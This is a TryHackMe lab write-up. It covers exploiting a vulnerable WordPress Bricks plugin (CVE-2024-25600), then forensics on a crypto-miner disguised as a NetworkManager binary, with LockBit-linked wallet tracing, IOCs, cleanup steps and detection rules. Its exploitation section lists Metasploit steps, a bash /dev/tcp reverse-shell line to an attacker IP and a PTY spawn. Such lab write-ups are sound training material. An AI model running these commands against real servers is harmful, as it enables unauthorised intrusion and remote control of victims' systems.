# TryHackMe — Ubuntu (LAMP) — Root / Crypto-Miner / LockBit

**Author:** `<yourhandle>`
**Target:** TryHackMe LAMP box (WordPress + KodExplorer + phpMyAdmin)
**Box summary:** Initial compromise via vulnerable Bricks WordPress plugin (v1.9.5). Got an unstable meterpreter shell and the first flag, then used a public CVE exploit to get a reliable reverse shell. Performed on-host forensics; found a disguised crypto-miner (`/lib/NetworkManager/nm-inet-dialog`) and wallet activity tracing to LockBit indicators.
**Date:** *(fill in)*

---

## TL;DR

* Recon: `nmap` + WordPress enumeration revealed Bricks plugin v1.9.5.
* Exploitation: used Metasploit to exploit Bricks (got a shell and the user flag), but shell was unreliable for post-exploitation.
* Achieved a stable shell by using the public exploit (CVE-2024-25600) from GitHub plus `ncat` + `bash` reverse.
* Local enumeration exposed a miner masquerading as a NetworkManager helper and a Bech32 BTC address. Tracing transfers showed ties to LockBit infrastructure.
* Collected flag: `THM{fl46_650c844110baced87e1606453b93f22a}`

---

## Box flag

```
cat /data/www/default/650c844110baced87e1606453b93f22a.txt
THM{fl46_650c844110baced87e1606453b93f22a}
```

---

## Timeline / What I did (concise)

1. `nmap` full port + service scan → found HTTP (WordPress) + webapps.
2. WordPress enumeration (WPScan / other WordPress enum tool) → Bricks plugin v1.9.5 identified.
3. `msfconsole` → used Bricks exploit to get an initial shell (meterpreter/command shell). Retrieved first flag from webroot. Meterpreter shell couldn't spawn a stable interactive reverse shell for further escalation.
4. Found public exploit repo for CVE-2024-25600 ([https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)). Used the PoC to run a payload that executed a proper `bash` reverse shell to my `ncat` listener.
5. With a working interactive shell, enumerated system, discovered miner masquerading as `/lib/NetworkManager/nm-inet-dialog` and mined wallet addresses in `/lib/NetworkManager/inet.conf`. Decoded obfuscated string (CyberChef / base64 techniques) and traced the BTC address `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`. Wallet flow tracing pointed to LockBit-related addresses.

---

## Commands / Evidence (repro)

> Note: replace attacker IP/port with your own when reproducing.

Recon:

```bash
# full port scan + service/version
nmap -sC -sV -p- -T4 <target-ip>

# WordPress enumeration (example)
wpscan --url http://<target-ip>/ -e vp,tt,cb
# or other WP enumerator to detect plugin versions
```

Exploitation (Metasploit):

```bash
msfconsole
# find and use appropriate bricks exploit module (module path varies)
# example sequence:
use exploit/<path>/bricks_*    # find correct module in msf
set RHOSTS <target-ip>
set RPORT 80
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT 4444
run

# got a shell; grabbed first flag:
cat /data/www/default/650c844110baced87e1606453b93f22a.txt
# => THM{fl46_650c844110baced87e1606453b93f22a}
```

Metasploit shell was unstable for interactive work, so I used the public PoC:

CVE-2024-25600 public PoC (what I used):

```
https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/README.md
# follow PoC instructions to get command exec on target
```

Spawn reliable reverse shell:

```bash
# on attacker
nc -lvnp 666

# on target (via the exploit command execution):
bash -c 'exec bash -i &>/dev/tcp/10.4.81.150/666 <&1'
# got a reliable interactive shell back (no meterpreter weirdness)
```

On-host enumeration & evidence:

```bash
# find suspicious processes / miners
ps aux | egrep -i 'xmrig|xmr|minerd|kinsing|kdevtmp|badr|inet|nm-inet|miner' | grep -v grep

# saw:
# root  3168  ... /lib/NetworkManager/nm-inet-dialog
# root  3169  ... /lib/NetworkManager/nm-inet-dialog

# inspect dir and suspicious config/log-like file
ls -l /lib/NetworkManager
cat /lib/NetworkManager/inet.conf

# inet.conf showed: repeated logs like "Status: Mining!", "Bitcoin Miner Thread Started", timestamps
# and a long encoded ID string. I decoded that with CyberChef: remove non-base64 chars -> base64 decode -> readable text.

# search filesystem for wallet-like strings
grep -RHoE 'bc1[a-z0-9]{10,62}|0x[a-fA-F0-9]{40}|4[A-Za-z0-9]{60,110}' /data /var/www /tmp /opt /home /usr/local /etc 2>/dev/null | head

# found:
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa

# validated on blockchain explorer and traced on-chain transfers to a larger receiver address:
32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM
```

Process inspection (attempts; needed sudo):

```bash
# attempted to inspect /proc/<pid>, but sudo required TTY; use a PTY to escalate:
python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /proc/3155/cmdline | tr '\0' ' '
readlink -f /proc/3155/exe
ls -l /proc/3155/fd
```

CyberChef decoding steps (short):

* Paste the encoded string.
* Use a small regex to remove non-base64 alphabet characters if the string contains non-b64 characters.
* Use "From Base64" to decode → result was readable and aided attribution.

---

## Findings / IOCs

* Malicious binary/process: `/lib/NetworkManager/nm-inet-dialog` (masquerading as NetworkManager binary)
* Log/config with miner output: `/lib/NetworkManager/inet.conf` (lots of `Status: Mining!`, `Bitcoin Miner Thread Started`)
* Wallet address (Bech32): `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
* Higher-value receiver in chain: `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM`
* Persistence: suspicious `ubuntu.service` observed active in `systemctl` output
* Attribution: wallet tracing points to LockBit-related flows (probable LockBit involvement)

---

## Attribution notes

* Direct attribution from a single wallet is always probabilistic — I traced the wallet transfers and found links to addresses and activity associated with LockBit reporting. Combine this with other forensic evidence (ransom notes, exfil log files, file names, external C2 indicators) for higher confidence.

---

## Containment & cleanup (recommended)

> **If this were production:** isolate host from network and preserve images / copies of `/lib/NetworkManager/nm-inet-dialog` and `/lib/NetworkManager/inet.conf` for forensics.

Local remediation outline (needs root):

```bash
# gather evidence first
sudo mkdir -p /root/evidence/miner
sudo cp -a /lib/NetworkManager/inet.conf /root/evidence/miner/
sudo cp -a /lib/NetworkManager/nm-inet-dialog /root/evidence/miner/
sudo sha256sum /root/evidence/miner/* > /root/evidence/miner/checksums.sha256
sudo tar czvf /root/miner_evidence.tgz -C /root/evidence miner

# then stop processes & cleanup
sudo pkill -f 'nm-inet-dialog' || sudo kill $(pgrep -f 'nm-inet-dialog')
sudo systemctl stop ubuntu.service
sudo systemctl disable ubuntu.service
sudo rm -f /lib/NetworkManager/nm-inet-dialog
sudo rm -f /lib/NetworkManager/inet.conf
sudo systemctl daemon-reload
```

---

## Detection & SIEM rules (quick)

* Alert on processes named `nm-inet-dialog` or `nm-*` running from non-standard paths (e.g. `/lib/NetworkManager` on servers).
* Detect file content containing `Bitcoin Miner Thread Started`, `Status: Mining!`, or repetitive `Miner()` strings in log files.
* Regex for Bech32 wallet detection: `bc1[a-z0-9]{10,62}` — scan webroot, uploads, `/tmp` etc.
* Monitor for new/unknown systemd units (`ubuntu.service`) created recently.

---

## Lessons learned

* Use layered exploitation: initial metasploit foothold is useful for flags, but PoCs or different payload delivery may be needed to get a reliable interactive shell for forensic work.
* Attackers often hide miners under trusted service names — always verify binary locations, owners, and checksums against distro packages.
* On-chain tracing of found wallets can reveal larger flows; use blockchain explorers and OSINT to correlate.

---

## Appendix — Links & references

* CVE-2024-25600 PoC (used to gain stable shell): `https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT`
* CyberChef (useful for decoding obfuscated strings): `https://gchq.github.io/CyberChef/`
* Blockchain explorer (wallet validation): `https://www.blockchain.com/explorer/` (or any Bech32/Bitcoin explorer)

